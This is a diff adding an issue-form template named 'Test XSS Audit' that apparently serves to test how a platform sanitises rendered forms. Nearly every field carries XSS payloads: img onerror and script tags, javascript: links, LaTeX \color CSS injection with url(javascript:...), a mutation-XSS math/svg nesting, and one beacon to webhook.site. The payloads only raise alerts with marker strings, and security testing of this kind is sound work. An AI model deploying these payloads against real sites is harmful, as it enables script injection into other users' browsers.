@@ -1,0 +1,61 @@
+name: Test XSS Audit
+description: |
+  # Test description with `<img src=x onerror=alert(1)>` in code
+  $\color{red;background:url(https://webhook.site/iform-desc-x)}{ISSUEFORM-DESC-X}$
+  $$\color{red;background:url(javascript:alert(1))}{ISSUEFORM-DESC-BLOCK}$$
+  
+  <img src=x onerror=alert('IF-desc-img')>
+  
+  [click-me-href](javascript:alert('if-desc-href'))
+  
+  <math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert('mxss-svg-fc')>">
+title: "[Test]: "
+labels: ["test"]
+body:
+  - type: markdown
+    attributes:
+      value: |
+        # Markdown field at start
+        $\color{red;background:url(javascript:alert(1))}{IF-MD-FIELD}$
+        <img src=x onerror=alert('if-md-img')>
+        <details><summary>x</summary><img src=x onerror=alert('details-img')></details>
+  - type: textarea
+    id: bug-desc
+    attributes:
+      label: Bug description with `<img src=x onerror=alert(1)>` 
+      description: |
+        Type your bug. $\color{red;background:url(javascript:alert(1))}{IF-TA-DESC}$
+        <img src=x onerror=alert('if-ta-desc-img')>
+      placeholder: "<script>alert('placeholder')</script>"
+      value: |
+        prefill body line 1
+        $$\color{red;background:url(javascript:alert(1))}{IF-TA-VALUE}$$
+        <img src=x onerror=alert('if-ta-value-img')>
+      render: shell
+    validations:
+      required: false
+  - type: input
+    id: extra-input
+    attributes:
+      label: "Input label `<img src=x onerror=alert(1)>`"
+      description: "input desc with $\color{red;background:url(javascript:alert(1))}{IF-INPUT-DESC}$"
+      placeholder: "in-place-holder"
+      value: "input default value with <img src=x onerror=alert('input-value')>"
+  - type: dropdown
+    id: dd1
+    attributes:
+      label: "Dropdown label `<img src=x onerror=alert(1)>`"
+      description: |
+        Pick an option. $\color{red;background:url(javascript:alert(1))}{IF-DD-DESC}$
+      options:
+        - "option 1 with <img src=x onerror=alert('dd-option-img')>"
+        - "option 2 with `<script>code</script>` in inline code"
+        - "$\color{red;background:url(javascript:alert(1))}{DD-OPT-MATH}$"
+  - type: checkboxes
+    id: cb1
+    attributes:
+      label: "Checkboxes label `<img src=x onerror=alert(1)>`"
+      description: "$\color{red;background:url(javascript:alert(1))}{IF-CB-DESC}$"
+      options:
+        - label: "checkbox option 1 `<img src=x onerror=alert(1)>`"
+        - label: "checkbox option 2 with math $\color{red;background:url(javascript:alert(1))}{CB-OPT-MATH}$"
